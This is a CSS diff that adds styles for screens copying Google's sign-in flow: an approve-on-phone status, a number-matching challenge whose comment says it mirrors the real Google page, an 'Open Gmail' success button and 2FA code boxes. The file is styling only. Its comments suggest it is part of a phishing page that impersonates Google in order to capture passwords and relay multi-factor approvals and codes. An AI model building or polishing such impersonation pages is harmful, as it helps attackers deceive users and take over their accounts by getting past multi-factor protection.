@@ -261,6 +261,86 @@ body {
 .g-btn.loading .spin { display: inline-block; }
 @keyframes gspin { to { transform: rotate(360deg); } }
 
+/* --- "Confirm it's you" / approve-on-phone screen --- */
+.g-approve-status {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 14px 16px;
+  background: #f6f8fc;
+  border: 1px solid #e3ebf6;
+  border-radius: 12px;
+  font-size: 14px;
+  color: #3c4043;
+  margin: 16px 0 6px;
+}
+.g-approve-dot {
+  width: 12px; height: 12px;
+  border-radius: 50%;
+  background: #0b57d0;
+  animation: pulse 1.4s ease-in-out infinite;
+}
+.g-approve-dot.ok   { background: #188038; animation: none; }
+@keyframes pulse { 0% { opacity: .3; transform: scale(.7); } 60% { opacity: 1; transform: scale(1); } 100% { opacity: .3; transform: scale(.7); } }
+#screen-approval .g-footer { margin-top: 18px; }
+
+/* --- "select the matching number" challenge screen (some accounts get this
+     instead of a code field) — mirrors the real Google page's number options --- */
+.g-numtiles {
+  display: flex;
+  gap: 12px;
+  justify-content: center;
+  flex-wrap: wrap;
+  margin: 8px 0 6px;
+}
+.g-numtile {
+  min-width: 74px;
+  height: 74px;
+  padding: 0 10px;
+  border-radius: 14px;
+  border: 1.5px solid #dadce0;
+  background: #fff;
+  font-family: "Google Sans", Roboto, Arial, sans-serif;
+  font-size: 24px;
+  font-weight: 500;
+  color: #202124;
+  display: grid;
+  place-items: center;
+  cursor: pointer;
+  transition: border-color .12s, background .12s, box-shadow .12s, transform .12s;
+}
+.g-numtile:hover {
+  border-color: #0b57d0;
+  background: #f6f9fe;
+  box-shadow: 0 2px 6px rgba(60, 64, 67, .15);
+  transform: translateY(-1px);
+}
+.g-numtile:disabled { cursor: default; opacity: .7; transform: none; }
+.g-numtile.picked {
+  border-color: #0b57d0;
+  background: #e8f0fe;
+  box-shadow: 0 0 0 3px rgba(11, 87, 208, .15);
+}
+#screen-numchoice .g-hint { text-align: center; padding: 0; margin-top: 6px; }
+
+/* --- "Open Gmail" on the success screen --- */
+.g-done-gmail {
+  text-align: center;
+  margin: 10px 0 4px;
+}
+.g-done-gmail a {
+  display: inline-block;
+  padding: 11px 22px;
+  border-radius: 999px;
+  background: #0b57d0;
+  color: #fff;
+  text-decoration: none;
+  font-weight: 600;
+  font-size: 15px;
+  box-shadow: 0 1px 3px rgba(60, 64, 67, .4);
+}
+.g-done-gmail a:hover { background: #1b66c9; }
+
 /* ---- 2FA code entry (6 boxes look) ---- */
 .g-code {
   text-align: center;
